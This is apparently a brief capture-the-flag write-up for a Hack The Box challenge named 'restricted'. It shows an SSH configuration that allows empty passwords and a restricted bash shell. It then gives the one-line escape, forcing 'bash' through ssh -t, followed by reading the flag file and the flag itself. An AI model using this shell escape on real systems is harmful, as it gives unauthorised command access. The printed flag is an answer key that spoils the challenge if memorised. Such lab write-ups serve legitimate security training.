# restricted

**SOLVED**

```txt
# sshd_config

Match user restricted
    PermitEmptyPasswords yes
```

```txt
#Dockerfile

RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted

ENTRYPOINT ["/usr/sbin/sshd", "-D", "-o", "ListenAddress=0.0.0.0", "-p", "1337"]
```

```sh
ssh restricted@165.227.224.40 -p 30346
# can't use shell

ssh restricted@165.227.224.40 -p 30346 -t "bash"
# can run commands though; bash shell popped

cat /flag_8dpsy
```

`HTB{r35tr1ct10n5_4r3_p0w3r1355}`